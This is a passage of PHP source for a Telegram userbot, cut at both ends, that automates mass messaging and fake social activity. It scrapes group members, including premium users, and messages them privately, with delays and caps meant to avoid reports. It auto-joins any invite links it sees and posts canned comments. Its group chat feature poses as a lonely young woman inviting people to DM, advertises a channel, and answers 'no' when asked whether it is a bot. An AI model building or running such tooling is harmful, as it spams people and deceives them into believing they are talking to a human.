//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Aut-For "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'Dft' or $text == 'حذف فوروارد':
unset($this->AutoFor['Msg-ID']);
$ReplyMessage("❌ - فوروارد زماندار باموفقیت حذف شد !");
break;
//=-=-=//=-=-=//=-=-=//=-=-=//[" Start-Help-Send "]=-=-=//=-=-=//=-=-=//=-=-=//
//=-=-=-=-=-=-=-=-=-=-=-=[" Send-Bot "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(sendall|sendpv|sendgaps) (.*)$/i", $text, $Send):
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$Value1 = '';
$Value2 = '';
$Value3 = '';
switch ($Send[1]) {
case 'sendall':
$Value1 = true;
$Value2 = false;
$Value3 = true;
break;
case 'sendpv':
$Value1 = true;
$Value2 = false;
$Value3 = false;
break;
case 'sendgaps':
$Value1 = false;
$Value2 = false;
$Value3 = true;
break;
}
$this->broadcastMessages(messages: [['message' => "$Send[2]"]],
filter: new Filter(allowUsers: $Value1, allowBots: $Value2, allowGroups: $Value3, allowChannels: false));
$ReplyMessage("✠ - عملیات ارسال پیام با موفقیت انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" For-Gap "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(sendgap) (.*)$/i", $text, $Send):
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'chat') {
try {
$this->Send($peer, $Send[2]);
Tools::sleep(time: rand(2, 5));
} catch (\Throwable $Throwable) {
}
}
}
$ReplyMessage("✠ - عملیات ارسال پیام با موفقیت انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Send-Exports "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, '/sendexports'):
$Send = substr($text, 13);
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 1;
while ($i < count($this->Member['list'])) {
foreach ($this->Member['list'] as $id) {
try {
$this->Send($id, $Send);
Tools::sleep(time: rand(2, 5));
} catch (\Throwable $Throwable) {
}
++$i;
}
}
$ReplyMessage("✠ - ارسال پیام باموفقیت برای `$i` نفر انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Send-Pv-Gap "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(sendpvgap) (.*)$/i", $text, $Send):
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$ReplyMessage("👈 - توجه داشته باشید که ربات به بیشتر از 15 کاربر جهت جلوگیری از ریپ شدن پیامی ارسال نمیکند ... !");
$offset = 0;
$i = 0;
while (true) {
$Chat = $this->channels->getParticipants(filter: ['_' => 'channelParticipantsRecent'], channel: $Send[2], offset: $offset, limit: 100)['users'];
if (empty($Chat) or $i == 15) break;
foreach ($Chat as $MemberGap) {
if (!$MemberGap['bot'] and isset($MemberGap['username']) and isset($MemberGap['first_name']) and $MemberGap['id'] != $this->getSelf()['id']) {
$this->Send($MemberGap['id'], $Send[3]);
Tools::sleep(time: rand(2, 5));
++$i;
}
}
$offset += 100;
}
$ReplyMessage("✠ - ارسال پیام باموفقیت برای `$i` نفر انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Send-Pv-Premium "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(sendpvpremium) (.*)$/i", $text, $Send):
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$offset = 0;
$i = 0;
while (true) {
$Chat = $this->channels->getParticipants(filter: ['_' => 'channelParticipantsRecent'], channel: $Send[2], offset: $offset, limit: 100)['users'];
if (empty($Chat)) break;
foreach ($Chat as $MemberGap) {
if (!$MemberGap['bot'] and $MemberGap['premium'] and $MemberGap['id'] != $this->getSelf()['id']) {
$this->Send($MemberGap['id'], $Send[3]);
Tools::sleep(time: rand(2, 5));
++$i;
}
}
$offset += 100;
}
$ReplyMessage("✠ - ارسال پیام باموفقیت برای `$i` کاربر پریمیوم انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-Answer "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, 'setanswer'):
$ip4 = trim(str_replace("/setanswer ", "", $text));
$ip3 = trim(str_replace("!setanswer ", "", $ip4));
$ip2 = trim(str_replace("#setanswer ", "", $ip3));
$ip1 = trim(str_replace("\setanswer ", "", $ip2));
$ip = trim(str_replace("setanswer ", "", $ip1));
$ip = explode("|", $ip . "|||||");
$Text = !empty(trim($ip[0])) ? trim($ip[0]) : "تنظیم نشد !";
$answer = !empty(trim($ip[1])) ? trim($ip[1]) : "تنظیم نشد !";
if (!isset($Answering[$Text])) {
$this->Answering[$Text] = $answer;
$ReplyMessage("
✠ - پیام جدید : `$Text`
✠ - پاسخ جدید : `$answer`
✅ - باموفقیت تنظیم شد !
");
}
else
$ReplyMessage("🖤 - این کلمه از قبل وجود داشت . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Answer "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(delanswer) (.*?) (.*)$/i", $text, $Del):
if (isset($Answering[$Del[2]])) {
unset($this->Answering[$Del[2]]);
$ReplyMessage("❌ - پیام `$Del[2]` باموفقیت حذف شد !");
}
else
$ReplyMessage("💢 -  پیام `$Del[2]` در لیست وجود ندارد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" List-Answer "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == "/answerlist":
if (count($Answering) > 0) {
$Text = "✅ - لیست پاسخ های تنظیم شده به شرح زیر میباشد : \n";
$counter = 1;
foreach ($Answering as $k => $ans) {
$Text .= "$counter - $k => $ans \n";
$counter++;
}
$ReplyMessage($Text);
}
else
$ReplyMessage("🙂 - پاسخی وجود ندارد . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Clean-Answer "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == '/cleananswers':
$this->Answering = [];
$ReplyMessage("💢 - لیست پاسخ پاکسازی شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-Comment "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, 'Setcomment'):
$this->Comment[] = substr($text, 11);
$ReplyMessage("✅ - متن مورد نظر باموفقیت به لیست اضافه شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Comment "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, 'Delcomment'):
$Del = substr($text, 11);
if (isset($this->Comment[$Del])) {
unset($this->Comment[$Del]);
$ReplyMessage("❌ - پیام `$Del` باموفقیت حذف شد !");
}
else
$ReplyMessage("💢 -  پیام `$Del` در لیست وجود ندارد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Lis-Comment "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == "Commentlist":
if (count($Comment) > 0) {
$Text = "✅  :\n";
$counter = 1;
foreach ($Comment as $List) {
$Text .= "$counter - `$List` \n";
$counter++;
}
$ReplyMessage($Text);
}
else
$ReplyMessage("🙂 - کامنتی وجود ندارد . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Clean-Answer "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'Cleancomment':
$this->Comment = [];
$ReplyMessage("💢 - لیست کامنت پاکسازی شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-Time-Send "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, '/time'):
$TimeSend = substr($text, 6);
$this->AutoFor['Time'] = $TimeSend * 60;
$ReplyMessage("✅ - ارسال زماندار باموفقیت در هر `$TimeSend` دقیقه  تنظیم شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-Text-Send "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, '/sst'):
if (!$this->Data['AutoSend']) {
$ReplyMessage("📌 - لطفا اول قابلیت را از بخش آپشن ها فعال کنید سپس اقدام به تنظیم کنید :");
return;
}
$Text = substr($text, 5);
$this->AutoSend['Text'] = $Text;
if ($this->AutoSend['Type']['Users']) $Text = "پیوی ها";
elseif ($this->AutoSend['Type']['Groups']) $Text = "گروه ها";
elseif ($this->AutoSend['Type']['Channels']) $Text = "چنل ها";
$ReplyMessage("✅ - متن ارسال زماندار باموفقیت  برای ارسال به `$Text` تنظیم شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Text-Send "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == '/dst' or $text == 'حذف ارسال':
unset($this->AutoSend['Text']);
$ReplyMessage("❌ - ارسال زماندار باموفقیت حذف شد !");
break;
}
//=-=-=-=-=-=-=-=-=-=-=-=[" End-Ring-Admin "]=-=-=-=-=-=-=-=-=-=-=-=
}


if ($this->Data['AutoJoin'] and preg_match_all('/(@\S+|https:\/\/t\.me\S+)/i', $text, $Link)) {
foreach ($Link[0] as $LinkGap) {
try {
try {
$ChatInvite = $this->messages->checkChatInvite(hash: $LinkGap);
if ($ChatInvite['_'] == 'chatInvite' and $ChatInvite['broadcast'] != '1' and $ChatInvite['participants_count'] >= $this->CountJoin) {
if ($UserID == $Admin or $UserID == isset($Admins['Admins'][$UserID])) {
$this->sendMessage(peer: $UserID, message: '✠ - جوین شدم !');
}
$this->channels->joinChannel(channel: $LinkGap);
}
} catch (\Throwable $Throwable) {
}
} catch (\danog\MadelineProto\RPCErrorException $RPCErrorException) {
}
}
}

//=-=-=-=-=-=-=-=-=-=-=-=[" Catch-Flood "]=-=-=-=-=-=-=-=-=-=-=-=
} catch (FloodError $FloodError) {
$i = ceil($FloodError->getWaitTime() / 60);
$this->SetData('AutoJoin', false);
$this->Send($Admin, "❌ - جوین خودکار ربات شما به دلیل محدودیت غیرفعال شد !");
$this->Send($Admin, "
💢 محدودیت ... ! ادمین عزیز ربات شما به مدت $i دقیقه خاموش شد !
👈 لطفا تا پایان محدودیت دستوری ارسال نکنید امکان دیلیت شدن اکانت شما هست !");
$FloodError->wait();
}
//=-=-=//=-=-=//=-=-=//=-=-=//[" End-Handler-Private "]=-=-=//=-=-=//=-=-=//=-=-=//
}


#[Handler]
public function HandlePrivateMessage(Incoming&PrivateMessage $Message): void
{
if (preg_match_all('/(@\S+|https:\/\/t\.me\S+)/i', $Message->message, $Link)) {
foreach ($Link[0] as $LinkGap) {
try {
try {
$this->channels->joinChannel(channel: $LinkGap);
$this->sendMessage(peer: $Message->chatId, message: '✠ - جوین شدم !');
Tools::sleep(time: rand(2, 5));
} catch (\Throwable $Throwable) {
}
} catch (\danog\MadelineProto\RPCErrorException $RPCErrorException) {
}
}
}

}

#[FilterNotEdited]
public function HandleChannel(Incoming&ChannelMessage $Message): void
{
$text = $Message->message;
if ($this->Data['CustomComment'] and isset($this->Comment)) {
if (count($this->Comment) == 1) {
$Send = $this->Comment[0];
}
else {
$Send = $this->Comment[array_rand($this->Comment)];
}
try {
Tools::sleep(time: $this->SecondsForComment);
$Message->getDiscussion()?->reply(
message: "$Send",
parseMode: ParseMode::MARKDOWN);
} catch (RPCErrorException $e) {
}
}

elseif ($this->Data['AutoComment']) {
if (str_contains($text, '😐')) {
$Mahdi_a_8 = array("Text" => array('😐😐', 'جالب 😐', 'عجب 😐', '😐😐😐', 'یاخدا 😐 ', 'مرض'), "Gif" => 'Poker-' . rand(1, 5));
}
elseif (str_contains($text, '😂')) {
$Mahdi_a_8 = array("Text" => array('😂😂', 'خخخخ', 'خنده داش ؟ 😕', 'درد', 'میخندی ؟', 'نخنددددد 😑😑', 'چ خنده ای داشت 🫥', 'ببند نیشتو 😒', 'رو آب بخندی ☺️', 'نمیری از خنده انتر 😐', '😂😂😂😂'), "Gif" => 'Fun-' . rand(1, 5));
}
elseif (str_contains($text, 'فکت')) {
$Mahdi_a_8 = array("Text" => array('فکت جالبی بود', 'فکت باحالی بود', 'فکت |:', '||||:', '(((((:', 'جالب بود', 'عالی'), "Gif" => 'Fun-' . rand(1, 5));
}
elseif (str_contains($text, 'انفجار') or str_contains($text, 'اپلیکیشن') or str_contains($text, 'تبلیغ')) {
return;
}
elseif (str_contains($text, 'جر')) {
$Mahdi_a_8 = array("Text" => array('نخوری', 'خخخ', '/////:'), "Gif" => 'Fun-' . rand(1, 5));
}
else {
$Mahdi_a_8 = array("Text" => array('پست جالی بود', '/:', 'عجب', 'جالب', 'واقعا ؟', 'جدی میفرمایی ؟', '😂😂', 'خخخ', 'خندیدیم', 'ادمین خسته نمیشی آیا ؟', '||||||||:', 'برگام', 'نفهمیدم |:', 'واییییی', 'اووووف', 'چییییی', 'عجبببببببب'), "Gif" => 'Fun-' . rand(1, 5));
}
if (!empty($Mahdi_a_8)) {
$Keys = array_filter(array_keys($Mahdi_a_8), function ($Key) use ($Mahdi_a_8) {
return $Mahdi_a_8[$Key] !== null;
});
$Key_Rand = $Keys[array_rand($Keys)];
if ($Key_Rand == "Text") {
try {
Tools::sleep(time: $this->SecondsForComment);
$Message->getDiscussion()?->reply(
message: $Mahdi_a_8['Text'][array_rand($Mahdi_a_8['Text'])],
parseMode: ParseMode::MARKDOWN);
} catch (RPCErrorException $e) {
}
}
elseif ($Key_Rand == "Gif" and $Message->fwdInfo) {
$Media = ['_' => 'inputMediaUploadedDocument', 'file' => "../../Data/Gif/{$Mahdi_a_8['Gif']}.gif"];
$this->SendMedia($Message->chatId, $Media, $Message->id, null);
}
}
}
}


//=-=-=//=-=-=//=-=-=//=-=-=//[" Start-Handler-Call "]=-=-=//=-=-=//=-=-=//=-=-=//
//=-=-=//=-=-=//=-=-=//=-=-=//[" Start-Handler-Call "]=-=-=//=-=-=//=-=-=//=-=-=//
#[Handler]
public function HandleCall(Incoming&VoIP $Call): void
{
global $URL;
if ($this->Data['AutoCall']) {
$Call->accept()->play(new RemoteUrl("$URL/y.ogg"));
}
}

//=-=-=//=-=-=//=-=-=//[" Start-Handler-Channel "]=-=-=//=-=-=//=-=-=//
//=-=-=//=-=-=//=-=-=//[" Start-Handler-Channel "]=-=-=//=-=-=//=-=-=//


#[Handler]
public function HandlePrivate(Incoming&PrivateMessage $Message): void
{
$text = $Message->message;
$MsgID = $Message->id ?? 0;
$UserID = $Message->senderId;
$ChatID = $Message->chatId;
$Answering = $this->Answering;
$matchingKeys = array_filter(array_keys($Answering), function ($key) use ($text) {
return str_contains($text, $key);
});
if (!empty($matchingKeys)) {
$matchedKey = reset($matchingKeys);
$matchedValue = $Answering[$matchedKey];
Tools::sleep(time: 1);
$this->messages->readHistory(peer: $UserID, max_id: $MsgID);
$SendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
Tools::sleep(time: 1);
$this->SetTyping($ChatID, $SendMessageTypingAction);
Tools::sleep(time: rand(2, 5));
$this->Send($ChatID, $matchedValue);
}
}

//=-=-=//=-=-=//=-=-=//[" Start-Handler-Group "]=-=-=//=-=-=//=-=-=//
//=-=-=//=-=-=//=-=-=//[" Start-Handler-Group "]=-=-=//=-=-=//=-=-=//
/**
 * @throws ClosedException
 * @throws StreamException
 */
#[Handler]
public function HandleGroup(Incoming&GroupMessage $GroupMessage): void
{
//=-=-=-=-=-=-=-=-=-=-=-=[" Variables "]=-=-=-=-=-=-=-=-=-=-=-=
$text = $GroupMessage->message;
$MsgID = $GroupMessage->id ?? 0;
$ChatID = $GroupMessage->chatId;
$AutoChat = $this->AutoChat;
$Dir = 'Data';
//=-=-=-=-=-=-=-=-=-=-=-=[" Function "]=-=-=-=-=-=-=-=-=-=-=-=
$ReplyMessage = function (string $text, ?ParseMode $parseMode = ParseMode::TEXT) use ($GroupMessage) {
$this->Message($GroupMessage, 'reply', $text, $parseMode);
};
//=-=-=-=-=-=-=-=-=-=-=-=[" Auto-Chat-Gap "]=-=-=-=-=-=-=-=-=-=-=-=
if ($AutoChat['AutoChat']['Gap'] and (time() - filemtime('Time.txt')) >= 600) {
Tools::sleep(time: rand(2, 5));
$SendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
$this->SetTyping($ChatID, $SendMessageTypingAction);
$TextForSend = array("Text" => array('سلام کسی فیلم قشنگ داره پیوی معرفی کنه نگا کنم❤️🚶‍♀️', 'تلگرام خوب کسی داره بفرسته پیوی ممنون میشم🚶‍♀️', 'سلام خوبین 👩‍🦯', 'سلام چخبرا👩‍🦯', 'اووه چقد شلوغه اینجا😐', 'دلم گرفته کسی نیست بیاد پی یکم درد و دل کنیم 🙂💔', 'لطفا یه ابجی بیاد بحرفیم پسر نیاد دلم گرفته🙂💔', 'یه ابجی بیاد پی سریع کارش دارم . مرسی🚶‍♀️', 'کی اینجا گیمره؟!🙄🚶‍♀️', 'کسی بلده چجوری برای اکانتم تایید بزارم بیاد پی🥺🚶‍♀️', 'کسی هست از ربات سازی سر در بیاره ؟!🚶‍♀️', 'رفقا ریپ شدم هرکی دوست داشت پیوی یه نقطه بندازه در بیام🚶‍♀️❤️', 'باو پسر نیاد پیوی دیگه☹️🚶‍♀️', 'خوبین ؟!🚶‍♀️', 'یه ابجی پی مخام دردو دل کنم باهاش🙁💋', 'هعی خیلی دلم گرفته 🚶‍♀️', 'اگر پیوی جواب نمیدم گروه ریپ بزنید روم یا پیویم اسپم کنید چون تلگرامم پره چنله🚶‍♀️🖤', 'یه ابجی مهربون بیاد پی لطفا🚶‍♀️🙂', 'کسی پک استیکر داره بفرسته پی ؟!☹️', 'کسی اهنگ دپ داره بده پی حالم گرفتس🚶‍♀️🖤', 'کسی هست از تهران باشه ؟!', 'کسی هست از اصفهان باشه؟؟', 'کسی هست از مشهد باشه ؟!', 'کسی هست از نیشابور باشه؟؟', 'هعییییی', 'سلامم', 'سلام', 'سلام خوبین ؟', 'سلام چطورین ؟', 'هعی خدااااا', 'ریپ میزنید اکانتم شلوغه نمیتونم جواب بدم شرمنده', 'حالتون چطوره ؟', 'دوستان استوریم فعاله براتون ؟', 'یکی هست قابلیت های پرمیوم رو کامل بگه ؟', 'اهنگ دپ دارین بدین پی', 'حوصلمممممم', 'چت پی', 'هعببببب', 'حالممم بددد', 'پووووففف', 'واقعا جالبه ///:', '/////:', '((((((:', 'چه گروه باحالی', ')))))))):', 'هووووووف', 'اصل بدین آشنا شیم (:', 'کی هی روم ریپ میزنه میگه رباتی ؟ 😐', 'گروه دارم میاین ؟ 🥲', 'پیوی نقطه بدین ریپمممم', 'گیف میشه فرستاد ؟', 'حوصلممممممم پیوی چنل دارین بدین جوین میشم', 'مجددا حوصلممممممم پیوی گروه دارین بدین جوین میدم', 'کسی از گوشی سر در میاره ؟', 'اگه توهم میخای ربات داشته باشی که بتونی باهاش استوری بزاری : source_s یه ادساین بزن جوین شو', 'سلام', 'خوبین ؟', 'خوبین', 'سلاممم', 'هعیی چرا کسی جوابمو نمیده |:', 'کسی هست ؟', 'سلام خوبین ؟', 'یکی روم ریپ بزنه ممنونم', 'چطورین ؟', 'چ شلوغ پلوغه ماشالا ماشالا', 'بچ ها ی دست بزنید واسه خاله لیلا', 'اهنگ بدین پی', 'ریپ چتممممم', 'تگ شدم انگار ؟', 'چ هوای خوبیییی', 'من اینجام چطور ؟', 'کی ادد کرده ؟', '//////:', 'انقد پیام دادین لود نمیشه جواب بدم', 'لود نمیشه گپ چرااااا', 'ای بابا', 'ای خداااا', 'برید کنار عشقتون امد 😎', 'چطور مطورین ؟', 'سلاام بچه ها', 'خدای من', 'فاب ریپ', 'حجم صبور ها بالاست لطفا پیام باشید 🙏'), "Sticker" => array('HANGSEED5', 'Golox', 'Jim_Carrey_746', 'HANGSEED13', 'Webp_14', 'Ijhoopppkmnn'), "Gif" => rand(1, 24));
$Keys = array_keys($TextForSend);
$Key_Rand1 = $Keys[array_rand($Keys)];
deleteFile('Time.txt');
$File = self::openFileAppendOnly('Time.txt');
$File->write(date("Y-m-d H:i:s"));
$File->close();
if ($Key_Rand1 == "Text") {
$this->Send($ChatID, $TextForSend['Text'][array_rand($TextForSend['Text'])]);
}
elseif ($AutoChat['AutoChat']['Sticker'] and $Key_Rand1 == "Sticker") {
$Media = $this->messages->getStickerSet(stickerset: ['_' => 'inputStickerSetShortName', 'short_name' => $TextForSend['Sticker'][array_rand($TextForSend['Sticker'])]]);
$this->SendMedia($ChatID, $Media['documents'][array_rand($Media['documents'])], $MsgID, null);
}
elseif ($AutoChat['AutoChat']['Gif'] and $Key_Rand1 == "Gif") {
$Media = ['_' => 'inputMediaUploadedDocument', 'file' => "$Dir/Gif/{$TextForSend['Gif']}.gif"];
$this->SendMedia($ChatID, $Media, $MsgID, null);
}
}

elseif ($AutoChat['AutoChat']['Gap'] and $GroupMessage->mentioned) {
Tools::sleep(time: rand(2, 5));
$Mahdi_a_8 = array();
$Text = ['مشهد', 'مشد', 'تهران', 'اصفهان', 'شیراز', 'مازندران', 'قم', 'ساری', 'شمال', 'بابلسر', 'کرج', 'کرمان', 'کرمانشاه', 'نیشابور', 'کریم', 'شهر', 'زنجان', 'آباد', 'قوچان', 'سمنان', 'گرمسار', 'فارس', 'کاشان', 'سبزوار', 'گلشن', 'یزد', 'خوزستان', 'لرستان', 'سهند', 'هرمزگان', 'گرگان', 'مکران', 'بلوچستان', 'خراسان', 'سیستان', 'بوشهر', 'البرز', 'ایلام', 'گیلان', 'بابلسر', 'آمل', 'بابل', 'آذربایجان'];
$Name = $this->getSelf()['first_name'];
if ($text == 'س' or str_contains($text, "سلام") or $text == 'صلام' or $text == 'صلم' or $text == 'سل' or $text == 'سلم' or $text == 'salam' or $text == 'سلاپ' or $text == 'صل' or $text == 'های' or $text == 'سیلام') {
$Mahdi_a_8 = array("Text" => array('سلام خوبی؟', 'سلام', 'علیک', 'صلام', 'خوبی؟', 'سلامم', 'سلام خوبی', 'سلام عزیزم خوبی', 'سلام اصل', 'چطوری ؟', 'سلام عزیزم'), "Reaction" => null, "Sticker" => null, "Voice" => 'Hi-' . rand(1, 5), "Gif" => null);
}
elseif (str_contains($text, 'بای') or str_contains($text, 'خدافظ') or str_contains($text, 'فعلا')) {
$Mahdi_a_8 = array("Text" => array('خدافظی', 'بسلامت', 'بای بده', 'حل بای', 'خدافظ', 'فعلا', 'میتونی بری', 'متنی بری', 'فلن', 'خب خدافظ'), "Reaction" => array('❤️', '👍'), "Sticker" => array('b612b3133db178_by_anipackbot', 'Ijhoopppkmnn'), "Voice" => 'Bay-' . rand(1, 5), "Gif" => null);
}
elseif (str_contains($text, 'خوبی') or str_contains($text, 'چطوری') or str_contains($text, 'خبی') or $text == 'khobi' or $text == 'خوبی؟' or str_contains($text, "خبی؟") or $text == 'khobi?' or $text == 'خوبم') {
$Mahdi_a_8 = array("Text" => array('تشکر', 'شما خوبی؟', 'ممنون', 'بخوبیت', 'مرسی تو خوبی؟', 'مرسی', 'شکر', 'میگذره', 'ممنون ت خوبی', 'خوبم ت خوبی', 'اوم بد نیستم ت چطوری', 'نه حالم بده یکم ت خوبی', 'آره بدک نیستم'), "Reaction" => array('❤️', '👍'), "Sticker" => array('HANGSEED5', 'Webp_14'), "Voice" => 'How-' . rand(1, 5), "Gif" => 'How-' . rand(1, 5));
}
elseif (str_contains($text, "مرسی") or $text == 'ممنون' or $text == 'تشکر' or $text == 'ممنان' or $text == 'سپاس' or $text == 'مر30' or $text == 'متشکر') {
$Mahdi_a_8 = array("Text" => array('کاری نکردم', 'فدات', 'قربونت', 'خواهش', 'خواهش میکنم'), "Reaction" => array('❤️', '👍'), "Sticker" => array('HANGSEED5', 'Webp_14'), "Voice" => null, "Gif" => 'Thanx-' . rand(1, 5));
}
elseif (str_contains($text, "چخبر") or str_contains($text, "چه خبر") or $text == 'چ خبر' or $text == 'چخبره' or $text == 'چخبر؟' or $text == 'چخبره؟' or $text == 'چ خبر؟') {
$Mahdi_a_8 = array("Text" => array('شماچخبر', 'سلامتیت', 'بی خبری', 'خبری نیس والا', 'ازتوچخبر', 'دسته تبر😐😂', 'هیچ سلامتی', 'سلامتی رهبر', 'برف اومده تا کمر', 'هیچ بدبختی', 'خبرای خوب', 'بی‌خبر ت چه خبر'), "Reaction" => null, "Sticker" => null, "Voice" => null, "Gif" => null);
}
elseif (str_contains($text, "و تو؟") or str_contains($text, "اصل") or $text == 'اصل؟' or $text == 'بیو' or $text == 'اصل بده' or $text == 'اصل میدی؟' or $text == 'اصل میدی') {
$Mahdi_a_8 = array("Text" => array(" 18 و شما ؟", "$Name هستم از ایران🥲", "اول شما ؟", "اول تو ؟", "پرنسس از آلمان  و شما ؟😂🥲", "اول شما اصل بده ؟", "$Name هستمممم🥲🥲🥲"), "Reaction" => array('👎', '👍'), "Sticker" => null, "Voice" => null, "Gif" => null);
}
elseif (str_contains($text, "ربات") or $text == 'ربات؟' or str_contains($text, "رباتی") or $text == 'رباتی؟' or $text == 'رباته' or $text == 'باتی' or $text == 'باتی؟') {
$Mahdi_a_8 = array("Text" => array("نه😐", "ربات نیستم 😐😐", "نه باو ربات چیه😐", "خیر ربات چیه ؟", "ربات چی ؟ ", "ن"), "Reaction" => array('👎', '😐', '🤔'), "Sticker" => null, "Voice" => 'Bot-' . rand(1, 5), "Gif" => 'Bot-' . rand(1, 5));
}
elseif (str_contains($text, "باشه") or $text == 'باش' or $text == 'باشه؟' or $text == 'باش؟' or $text == 'حله' or $text == 'اوکیه' or $text == 'حل' or $text == 'اوکی' or $text == 'اوم' or $text == 'اوک') {
$Mahdi_a_8 = array("Text" => array("جاشه - ", "حله - ", "خوبه -", "اوکیه -"), "Reaction" => array('👎', '👍'), "Sticker" => array('HANGSEED5', 'Webp_14'), "Voice" => null, "Gif" => 'Ok-' . rand(1, 5));
}
elseif ($text == 'خش' or $text == 'خوش' or $text == 'خشبختم' or $text == 'خوش بختم' or $text == 'خش بختم' or $text == 'خوشبختم') {
$Mahdi_a_8 = array("Text" => array('قربونت', 'مرسی', 'ممنون', 'تشکر', 'فدات'), "Reaction" => array('❤️', '👍'), "Sticker" => array('Golox', 'Webp_14'), "Voice" => null, "Gif" => null);
}
elseif (str_contains($text, "چیه") or str_contains($text, "چیشد") or str_contains($text, "چشد")) {
$Mahdi_a_8 = array("Text" => array('هیچی', 'چیزی نیست', 'هیچ', 'هچ'), "Reaction" => null, "Sticker" => array('Ijhoopppkmnn', 'Webp_14'), "Voice" => null, "Gif" => 'What-' . rand(1, 5));
}
elseif (str_contains($text, "فدات") or $text == 'قربونت' or $text == 'فداتم') {
$Mahdi_a_8 = array("Text" => array('نشی', 'بوص', 'نشو', 'بوس', 'قربانت'), "Reaction" => array('❤️'), "Sticker" => array('HANGSEED3', 'Webp_14'), "Voice" => null, "Gif" => null);
}
elseif (str_contains($text, "ویس")) {
$Mahdi_a_8 = array("Text" => array('الان نمیتونم', 'باشه', 'نمیتونم', 'صدام خوب نیست', 'چی بگم ؟'), "Reaction" => array('👎', '👍'), "Sticker" => null, "Voice" => 'Voice-' . rand(1, 5), "Gif" => null);
}
elseif (str_contains($text, "سکسی")) {
$Mahdi_a_8 = array("Text" => array('خیلی بی ادبی /:', 'بی ادب', 'هعیی', 'باشه', 'جدن ؟'), "Reaction" => array('👎', '😐', '🤔'), "Sticker" => null, "Voice" => null, "Gif" => null);
}
elseif ($this->strContains($text, $Text)) {
$Mahdi_a_8 = array("Text" => array('خوشبختم', 'خشبختم', 'خوش', 'خش', '', 'خوش بختم', 'خش بختم', 'کجاشی ؟', 'کجاش ؟', 'اوو چ دور', 'خوشوقتم'), "Reaction" => null, "Sticker" => null, "Voice" => null, "Gif" => null);
}
elseif (str_contains($text, "عجب")) {
$Mahdi_a_8 = array("Text" => array('مشتی رعجب', 'رعجب', 'پجب', 'مچب', 'رعجب'), "Reaction" => null, "Sticker" => array('HANGSEED3', 'Webp_14'), "Voice" => null, "Gif" => null);
}
elseif (str_contains($text, "تگ")) {
$Mahdi_a_8 = array("Text" => array('چیه همش تگ میکنی', 'چیه ؟', 'چیشد ؟', 'جانم ؟', 'جانم', 'جونم ؟', 'چرا همش تگ میکنی ؟'), "Reaction" => array('👎', '😐', '🤔', '👍'), "Sticker" => array('HANGSEED3', 'Webp_14'), "Voice" => null, "Gif" => 'Tag-' . rand(1, 5));
}
elseif (str_contains($text, '😐')) {
$Mahdi_a_8 = array("Text" => array('چرا پوکر ؟', 'چرا انقدر پوکری ؟', 'هوووف'), "Reaction" => array('👎', '😐', '👍'), "Sticker" => array('HANGSEED3', 'Webp_14'), "Voice" => null, "Gif" => 'Poker-' . rand(1, 5));
}
elseif (str_contains($text, '😂')) {
$Mahdi_a_8 = array("Text" => array('هعیی بخند', '😐😕.', 'بله - 😂', 'گل بخندی', 'بخندد'), "Reaction" => null, "Sticker" => array('HANGSEED3', 'Webp_14'), "Voice" => null, "Gif" => 'Fun-' . rand(1, 5));
}
if (!empty($Mahdi_a_8)) {
$Keys = array_filter(array_keys($Mahdi_a_8), function ($Key) use ($Mahdi_a_8) {
return $Mahdi_a_8[$Key] !== null;
});
$Key_Rand = $Keys[array_rand($Keys)];
if ($Key_Rand == "Text") {
$SendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
$this->SetTyping($ChatID, $SendMessageTypingAction);
Tools::sleep(time: rand(2, 5));
try {
$ReplyMessage($Mahdi_a_8['Text'][array_rand($Mahdi_a_8['Text'])]);
} catch (\danog\MadelineProto\RPCErrorException $RPCErrorException) {
}
}
elseif ($Key_Rand == "Reaction") {
$GroupMessage->addReaction($Mahdi_a_8['Reaction'][array_rand($Mahdi_a_8['Reaction'])]);
}
elseif ($AutoChat['AutoChat']['Sticker'] and $Key_Rand == "Sticker") {
